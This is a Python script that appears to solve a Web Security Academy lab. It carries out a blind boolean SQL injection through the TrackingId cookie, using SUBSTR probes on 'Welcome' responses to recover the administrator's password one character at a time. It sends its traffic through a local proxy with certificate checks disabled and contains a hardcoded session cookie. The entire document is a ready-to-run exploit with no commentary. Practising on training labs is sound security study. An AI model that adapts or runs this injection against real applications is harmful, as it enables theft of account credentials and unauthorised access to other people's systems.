import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
host = "https://ac5a1f9b1e2274fdc04d1868005a0051.web-security-academy.net"
def main():
    password=""
    length=20
    print("getting the administrator")
    for i in range(1, length+1):
        for j in range(48, 123):
            enc_payload=urllib.parse.quote(("JDPDdLWuI99iL9cj' AND SUBSTR((SELECT password FROM users WHERE username='administrator'), %s,1) = '%s'  --" %(i, chr(j))))
            cookies = {'TrackingId': enc_payload, 'session': "2U8MGaftA7m1dcilPoL3NNQJbVpGZ94O"}
            response = requests.get(host, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" in response.text:
                password = password + chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+ password + chr(j))
                sys.stdout.flush()

if __name__ == "__main__":
    main()
                
